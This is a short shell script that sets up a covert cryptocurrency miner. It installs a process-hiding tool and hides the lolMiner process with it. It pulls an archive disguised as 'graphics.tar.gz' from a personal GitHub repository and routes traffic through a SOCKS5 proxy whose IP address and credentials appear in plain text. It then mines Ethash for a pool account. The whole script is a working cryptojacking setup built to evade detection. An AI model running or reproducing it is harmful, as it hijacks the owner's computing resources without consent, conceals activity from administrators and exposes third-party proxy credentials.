apt update && apt -y install sudo wget curl unzip

sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -

apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata

wget https://github.com/DeniBogeh/DeniBogehh/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 =  45.140.13.119:9132 
socks5_username = npxpikyu
socks5_password = j3l3wm9qc29a
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

./graftcp/graftcp wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.48/lolMiner_v1.48_Lin64.tar.gz && tar -xf lolMiner_v1.48_Lin64.tar.gz

chmod +x 1.48

ph add lolMiner

./graftcp/graftcp ./1.48/lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user teguhcong.tissumagic#053-wawv --ethstratum ETHPROXY
